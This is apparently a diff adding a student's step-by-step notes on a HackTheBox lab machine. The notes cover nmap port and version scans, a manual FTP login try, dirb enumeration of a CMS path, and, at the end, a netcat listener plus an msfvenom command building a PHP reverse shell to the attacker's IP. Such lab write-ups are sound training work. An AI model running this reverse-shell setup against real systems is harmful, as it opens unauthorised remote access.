@@ -1,0 +1,87 @@
+IP Address for Wallet in HackTheBox
+10.129.227.171
+
+Step 1:
+Scan for open ports
+nmap -sT 10.129.171
+
+Output:
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 15:12 CST
+Nmap scan report for 10.129.227.171
+Host is up (0.059s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 0.88 seconds
+
+Step 2:
+Connect to the open port
+nc 10.129.227.171
+
+Output:
+220 wallet.htb FTP server (Version 6.4/OpenBSD/Linux-ftpd-0.17) ready.
+
+- you can input stuff
+220 wallet.htb FTP server (Version 6.4/OpenBSD/Linux-ftpd-0.17) ready.
+USER ab@example.com ** INPUT **
+331 Password required for ab@example.com.
+PASS asdfjkl;  ** INPUT **
+530 Login incorrect.
+
+Step 2.1:
+You can also use different flags to get different information
+nmap -sV 10.129.227.171 -p21
+
+Output:
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 15:15 CST
+Nmap scan report for 10.129.227.171
+Host is up (0.035s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     OpenBSD ftpd 6.4 (Linux port 0.17)
+Service Info: Host: wallet.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
+
+Step 2.2:
+nmap -sV 10.129.227.171 -p80
+
+Output:
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 15:16 CST
+Nmap scan report for 10.129.227.171
+Host is up (0.033s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.32 seconds
+                                                               
+
+Step 3:
+You can manually connect to these IP's on web browsers
+In brower search bar: 10.129.227.171
+
+
+============================================================
+https://google.com/robots.txt
+
+Vulnerability found on OWASP
+10.129.227.171/cms/codebase/dir.php?type=filenew
+
+you can run the command:
+dirb https://10.129.227.171/cms/
+and it will find different openings
+
+============================================================
+In one terminal:
+Listen at this port:
+─$ nc -lvvp 3350       
+listening on [any] 3350 ...
+
+In another terminal:
+msfvenom -p php/reverse_php -f raw LHOST=10.10.14.12 LPORT=3350 > my-shell.php
